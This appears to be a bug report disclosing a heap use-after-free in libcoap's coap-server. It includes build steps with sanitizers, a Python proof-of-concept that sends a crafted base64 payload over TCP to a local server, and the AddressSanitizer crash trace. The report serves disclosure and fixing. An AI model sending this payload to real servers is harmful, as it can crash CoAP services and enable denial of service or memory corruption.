## Problem Description
- Vulnerability Type: Heap Use-After-Fre
- Severity: High
- Target: libcoap
- version: develop(just clone)

### Expected Behavior
The expected behavior is that the coap_option_iterator_init function should operate on a valid and properly initialized memory region. Once a CoAP session is marked as disconnected and the associated memory is freed, no other functions should retain or dereference pointers to that memory. The memory management logic should guarantee that freed resources are not accessed afterward, ensuring the server handles requests gracefully and securely without crashing.

### Actual Behavior
In reality, the coap_option_iterator_init function attempts to access a memory address that was already released by the coap_session_disconnected_lkd function in coap_session.c. As a result, this results in a heap-use-after-free, where freed memory is accessed, triggering a crash. The AddressSanitizer detects this invalid access and aborts the program, highlighting the unsafe memory usage. This bug compromises the stability of the server and may lead to undefined behavior or security issues in a production environment.

## Steps to reproduce
### build env
clone the project:
```bash
git clone https://github.com/obgm/libcoap.git
```
Set the environment variables for the compiler and linker to include ASan andUBsan:
```bash
export CC=clang CXX=clang++
export CFLAGS="-g -fsanitize=address,undefined -fno-omit-frame-pointer"
export CXXFLAGS="-g -fsanitize=address,undefined -fno-omit-frame-pointer"
export LDFLAGS="-fsanitize=address,undefined"
```
```bash
mkdir build
cd build
```
Compile the coap-server and run it
```bash
cmake ..
make -j$(nproc) coap-server
./coap-server -A 127.0.0.1 -e -d 100 -v 9 -p 5783
```
### script
```python
import socket
import base64
b64_data = "QP8QAEAAAOUA/wAQAEAA/xAAQAA="

raw_data = base64.b64decode(b64_data)


host = "127.0.0.1"
port = 5783


with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((host, port))
    s.sendall(raw_data)
    print(f"sent {len(raw_data)} byte data to {host}:{port}")
```
## Debug log
```
=================================================================
==39622==ERROR: AddressSanitizer: heap-use-after-free on address 0x50d0000007d8 at pc 0x5bc264cc07cd bp 0x7ffed23fc0c0 sp 0x7ffed23fc0b8
READ of size 8 at 0x50d0000007d8 thread T0
    #0 0x5bc264cc07cc in coap_option_iterator_init /home/godrun/Desktop/FuzzforCVE/libcoapfuzzing/targets/reproduce/libcoap/src/coap_option.c:125:26
    #1 0x5bc264cc1243 in coap_check_option /home/godrun/Desktop/FuzzforCVE/libcoapfuzzing/targets/reproduce/libcoap/src/coap_option.c:206:3
    #2 0x5bc264c18391 in coap_get_block_b /home/godrun/Desktop/FuzzforCVE/libcoapfuzzing/targets/reproduce/libcoap/src/coap_block.c:70:24
    #3 0x5bc264cb2b14 in handle_request /home/godrun/Desktop/FuzzforCVE/libcoapfuzzing/targets/reproduce/libcoap/src/coap_net.c:3964:7
    #4 0x5bc264c9fe9c in coap_dispatch /home/godrun/Desktop/FuzzforCVE/libcoapfuzzing/targets/reproduce/libcoap/src/coap_net.c:4634:7
    #5 0x5bc264c9c3b8 in coap_read_session /home/godrun/Desktop/FuzzforCVE/libcoapfuzzing/targets/reproduce/libcoap/src/coap_net.c:2499:17
    #6 0x5bc264ca6821 in coap_io_do_epoll_lkd /home/godrun/Desktop/FuzzforCVE/libcoapfuzzing/targets/reproduce/libcoap/src/coap_net.c:2734:13
    #7 0x5bc264c8150d in coap_io_process_with_fds_lkd /home/godrun/Desktop/FuzzforCVE/libcoapfuzzing/targets/reproduce/libcoap/src/coap_io.c:2109:5
    #8 0x5bc264c06103 in main /home/godrun/Desktop/FuzzforCVE/libcoapfuzzing/targets/reproduce/libcoap/examples/coap-server.c:2712:20
    #9 0x77d21ae2a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #10 0x77d21ae2a28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #11 0x5bc264b27f74 in _start (/home/godrun/Desktop/FuzzforCVE/libcoapfuzzing/targets/reproduce/libcoap/build/coap-server+0x155f74) (BuildId: 570c2e5d9ceec94f8df6289cbcc9cff536435b52)

0x50d0000007d8 is located 72 bytes inside of 144-byte region [0x50d000000790,0x50d000000820)
freed by thread T0 here:
    #0 0x5bc264bc2b2a in free (/home/godrun/Desktop/FuzzforCVE/libcoapfuzzing/targets/reproduce/libcoap/build/coap-server+0x1f0b2a) (BuildId: 570c2e5d9ceec94f8df6289cbcc9cff536435b52)
    #1 0x5bc264d22d57 in coap_session_disconnected_lkd /home/godrun/Desktop/FuzzforCVE/libcoapfuzzing/targets/reproduce/libcoap/src/coap_session.c:1099:5
    #2 0x5bc264c8b13c in coap_send_internal /home/godrun/Desktop/FuzzforCVE/libcoapfuzzing/targets/reproduce/libcoap/src/coap_net.c:2000:5
    #3 0x5bc264cb2a71 in handle_request /home/godrun/Desktop/FuzzforCVE/libcoapfuzzing/targets/reproduce/libcoap/src/coap_net.c:3920:11
    #4 0x5bc264c9fe9c in coap_dispatch /home/godrun/Desktop/FuzzforCVE/libcoapfuzzing/targets/reproduce/libcoap/src/coap_net.c:4634:7
    #5 0x5bc264c9c3b8 in coap_read_session /home/godrun/Desktop/FuzzforCVE/libcoapfuzzing/targets/reproduce/libcoap/src/coap_net.c:2499:17
    #6 0x5bc264ca6821 in coap_io_do_epoll_lkd /home/godrun/Desktop/FuzzforCVE/libcoapfuzzing/targets/reproduce/libcoap/src/coap_net.c:2734:13
    #7 0x5bc264c8150d in coap_io_process_with_fds_lkd /home/godrun/Desktop/FuzzforCVE/libcoapfuzzing/targets/reproduce/libcoap/src/coap_io.c:2109:5
    #8 0x5bc264c06103 in main /home/godrun/Desktop/FuzzforCVE/libcoapfuzzing/targets/reproduce/libcoap/examples/coap-server.c:2712:20
    #9 0x77d21ae2a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #10 0x77d21ae2a28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #11 0x5bc264b27f74 in _start (/home/godrun/Desktop/FuzzforCVE/libcoapfuzzing/targets/reproduce/libcoap/build/coap-server+0x155f74) (BuildId: 570c2e5d9ceec94f8df6289cbcc9cff536435b52)

previously allocated by thread T0 here:
    #0 0x5bc264bc2dc3 in malloc (/home/godrun/Desktop/FuzzforCVE/libcoapfuzzing/targets/reproduce/libcoap/build/coap-server+0x1f0dc3) (BuildId: 570c2e5d9ceec94f8df6289cbcc9cff536435b52)
    #1 0x5bc264cd3873 in coap_pdu_init /home/godrun/Desktop/FuzzforCVE/libcoapfuzzing/targets/reproduce/libcoap/src/coap_pdu.c:119:9
    #2 0x5bc264c9c077 in coap_read_session /home/godrun/Desktop/FuzzforCVE/libcoapfuzzing/targets/reproduce/libcoap/src/coap_net.c:2483:36
    #3 0x5bc264ca6821 in coap_io_do_epoll_lkd /home/godrun/Desktop/FuzzforCVE/libcoapfuzzing/targets/reproduce/libcoap/src/coap_net.c:2734:13
    #4 0x5bc264c8150d in coap_io_process_with_fds_lkd /home/godrun/Desktop/FuzzforCVE/libcoapfuzzing/targets/reproduce/libcoap/src/coap_io.c:2109:5
    #5 0x5bc264c06103 in main /home/godrun/Desktop/FuzzforCVE/libcoapfuzzing/targets/reproduce/libcoap/examples/coap-server.c:2712:20
    #6 0x77d21ae2a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #7 0x77d21ae2a28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #8 0x5bc264b27f74 in _start (/home/godrun/Desktop/FuzzforCVE/libcoapfuzzing/targets/reproduce/libcoap/build/coap-server+0x155f74) (BuildId: 570c2e5d9ceec94f8df6289cbcc9cff536435b52)

SUMMARY: AddressSanitizer: heap-use-after-free /home/godrun/Desktop/FuzzforCVE/libcoapfuzzing/targets/reproduce/libcoap/src/coap_option.c:125:26 in coap_option_iterator_init
Shadow bytes around the buggy address:
  0x50d000000500: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd
  0x50d000000580: fd fd fd fd fd fd fa fa fa fa fa fa fa fa fd fd
  0x50d000000600: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x50d000000680: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd
  0x50d000000700: fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa
=>0x50d000000780: fa fa fd fd fd fd fd fd fd fd fd[fd]fd fd fd fd
  0x50d000000800: fd fd fd fd fa fa fa fa fa fa fa fa fd fd fd fd
  0x50d000000880: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa
  0x50d000000900: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x50d000000980: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x50d000000a00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==39622==ABORTING

```
